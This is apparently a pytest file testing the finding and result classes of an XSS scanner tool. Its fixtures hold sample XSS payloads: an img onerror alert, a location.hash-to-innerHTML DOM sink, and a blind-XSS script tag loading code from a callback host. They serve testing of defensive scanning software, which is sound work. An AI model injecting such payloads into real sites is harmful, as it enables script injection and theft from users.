# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Tests for engine/reporter.py — ScanResult and finding dataclasses.
"""

import threading
import time

import pytest

from stingxss.engine.reporter import (
    ScanResult,
    ReflectedFinding,
    DomFinding,
    BlindFinding,
    ReflectionContext,
    FindingType,
)


def _reflected(confirmed: bool = True) -> ReflectedFinding:
    return ReflectedFinding(
        url="https://example.com/search?q=x",
        parameter="q",
        method="GET",
        context=ReflectionContext.HTML_BODY,
        payload='<img src=x onerror=alert(1)>',
        confirmed=confirmed,
        evidence="<p><img src=x onerror=alert(1)></p>",
    )


def _dom() -> DomFinding:
    return DomFinding(
        url="https://example.com/",
        source="location.hash",
        sink="innerHTML",
        line=10,
        snippet="elem.innerHTML = location.hash.slice(1);",
    )


def _blind() -> BlindFinding:
    return BlindFinding(
        url="https://example.com/comment",
        parameter="body",
        method="POST",
        payload='<script src="https://cb.io/x.js"></script>',
        callback="https://cb.io",
    )


class TestScanResult:
    def test_initial_state(self):
        r = ScanResult(target="https://example.com")
        assert r.total_findings == 0
        assert r.success is True  # no errors and findings=0 still success

    def test_total_findings(self):
        r = ScanResult(target="https://example.com")
        r.reflected.append(_reflected())
        r.dom.append(_dom())
        r.blind.append(_blind())
        assert r.total_findings == 3

    def test_finish_sets_duration(self):
        r = ScanResult(target="https://example.com")
        time.sleep(0.01)
        r.finish()
        assert r.duration_s > 0

    def test_to_dict_structure(self):
        r = ScanResult(target="https://example.com")
        r.reflected.append(_reflected())
        r.dom.append(_dom())
        r.blind.append(_blind())
        r.finish()
        d = r.to_dict()
        assert d["target"] == "https://example.com"
        assert d["total_findings"] == 3
        assert len(d["findings"]) == 3
        types = {f["type"] for f in d["findings"]}
        assert FindingType.REFLECTED_XSS in types
        assert FindingType.DOM_XSS in types
        assert FindingType.BLIND_XSS in types

    def test_thread_safe_append_reflected(self):
        r = ScanResult(target="https://example.com")
        errors = []

        def worker():
            try:
                for _ in range(100):
                    r.append_reflected(_reflected())
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert not errors
        assert len(r.reflected) == 1000

    def test_thread_safe_append_dom(self):
        r = ScanResult(target="https://example.com")

        def worker():
            for _ in range(50):
                r.append_dom(_dom())

        threads = [threading.Thread(target=worker) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(r.dom) == 250

    def test_append_error(self):
        r = ScanResult(target="https://example.com")
        r.append_error("something went wrong")
        assert "something went wrong" in r.errors

    def test_append_log(self):
        r = ScanResult(target="https://example.com")
        r.append_log("[*] test message")
        assert "[*] test message" in r.log

    def test_success_false_when_errors_and_no_findings(self):
        r = ScanResult(target="https://example.com")
        r.errors.append("fatal error")
        assert r.success is False

    def test_success_true_when_findings_despite_errors(self):
        r = ScanResult(target="https://example.com")
        r.errors.append("some non-fatal error")
        r.reflected.append(_reflected())
        assert r.success is True
